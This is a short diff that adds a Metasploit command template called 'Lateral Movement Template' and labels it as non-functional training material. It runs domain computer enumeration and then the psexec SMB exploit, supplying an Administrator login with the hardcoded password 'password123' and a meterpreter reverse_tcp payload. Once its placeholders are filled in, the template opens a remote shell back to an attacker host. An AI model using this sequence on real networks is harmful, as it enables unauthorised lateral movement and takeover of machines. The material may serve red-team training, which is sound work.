@@ -1,0 +1,15 @@
+# Lateral Movement Template
+# For Training Use – Non-functional Template
+
+use post/windows/gather/enum_domain_computers
+set SESSION <SESSION_ID>
+run
+
+use exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST <TARGET_IP>
+set SMBUser Administrator
+set SMBPass password123
+set LHOST <LHOST>
+set LPORT <LPORT>
+exploit
